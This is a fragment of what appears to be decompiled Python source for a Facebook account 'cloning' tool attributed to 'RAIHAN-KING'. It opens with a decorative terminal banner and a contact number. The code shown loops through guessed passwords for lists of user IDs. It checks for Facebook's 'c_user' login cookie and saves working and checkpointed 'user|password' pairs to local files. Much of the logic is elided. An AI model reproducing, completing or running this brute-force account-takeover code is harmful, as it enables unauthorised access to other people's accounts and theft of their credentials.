# Decompile by Mardis (Tools By RAIHAN-KING)
...
\033[1;33m╔═══════════════════════════════════════════════╗
║\033[1;32m🌺WELCOME TO  𝐑𝐀𝐈𝐇𝐀𝐍  COMMAND WORLD 2.0🌺\033[1;33m║
╚═══════════════════════════════════════════════╝                                             
\033[32;1m╔═══════════════════════════════════════════════╗
\033[32;1m║ ╔═══════════════════════════════════════════╗ ║
\033[32;1m║ ║\033[91;1m❤︎[❥] 𝐓𝐎𝐎𝐋S    : \033[31;1m\033[36;1m FILE CLONNING                \033[32;1m║ ║
\033[32;1m║ ╠═══════════════════════════════════════════╣ ║
...
\033[32;1m║ ╠═══════════════════════════════════════════╣ ║
\033[32;1m║ ║\033[33;1m❤︎[❥] W𝐇𝐀𝐓S𝐀PP : \033[32;1m\033[37;1m 01618921827               \033[32;1m║ ║
\033[32;1m║ ╠═══════════════════════════════════════════╣ ║
...
\033[32;1m║ ╠═══════════════════════════════════════════╣ ║
\033[32;1m║ ║\033[36;1m❤︎[❥] VE𝐑S𝐎N   : \033[32;1m\033[1;91m     🤷‍♂️ .      \033[32;1m║ ║
\033[32;1m║ ╚═══════════════════════════════════════════╝ ║
\033[32;1m╚═══════════════════════════════════════════════╝""")                                       
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r\x1b[1;92m[RAIHAN] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H}[RAIHAN-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('RAIHAN_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s[RAIHAN-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('RAIHAN_CP.txt' , 'a').write('%s\n' % wrt)
                        break
